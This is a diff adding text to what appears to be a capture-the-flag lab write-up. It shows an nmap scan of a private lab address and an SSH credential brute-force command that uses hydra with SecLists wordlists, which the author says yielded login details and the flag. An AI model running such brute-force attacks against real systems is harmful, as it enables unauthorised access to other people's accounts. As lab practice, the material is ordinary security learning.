@@ -1,3 +1,13 @@
+After getting the ip and opening it into the new tab doesn't let us connect to the page instead it gave us that chrome standard error
+
+```error
+ERR_CONNECTION_REFUSED
+
+```
+
+So i tried running the nmap scan too what comes out and here is the result 
+
+```
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-29 15:08 +0530
 Nmap scan report for 10.49.190.65
 Host is up (0.061s latency).
@@ -25,3 +35,14 @@ OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 
 Network Distance: 3 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Except what room was saying i said leave the mess why messing when i could do it simply by bruteforcing.
+
+and with the command i was able to get the username and password simply 
+
+```bash
+ydra -L /home/Seclists/Usernames/top-usernames-shortlist.txt -P /home/Seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ssh://10.48.156.200 -t 4
+```
+
+And in this way i got the password and the username and i was able to get the flag within the system.
